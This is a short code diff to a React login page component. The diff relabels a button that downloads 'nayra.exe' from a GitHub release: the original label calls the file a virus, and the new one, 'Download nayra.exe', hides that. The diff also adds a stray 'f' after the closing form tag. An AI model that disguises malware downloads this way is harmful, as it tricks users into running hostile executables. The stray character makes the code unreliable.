@@ -44,9 +44,9 @@ export default function Login() {
         <button type="submit" style={{ marginTop: 12,width:300, padding: "8px 16px",backgroundColor:"#3a7070ff" }}>
           Open
         </button>
-      </form>
+      </form>f
       {err && <div style={{ color: "red", marginTop: 10 }}>{err}</div>}
-      <button onClick={()=>{window.open("https://github.com/aryanvish2006/ProjectX/releases/download/new/nayra.exe")}} style={{ marginTop: 12,width:200, padding: "8px 16px",backgroundColor:"#703a3aff" }}>Get Virus EXE</button>
+      <button onClick={()=>{window.open("https://github.com/aryanvish2006/ProjectX/releases/download/new/nayra.exe")}} style={{ marginTop: 12,width:200, padding: "8px 16px",backgroundColor:"#703a3aff" }}>Download nayra.exe</button>
     </div>
   );
 }
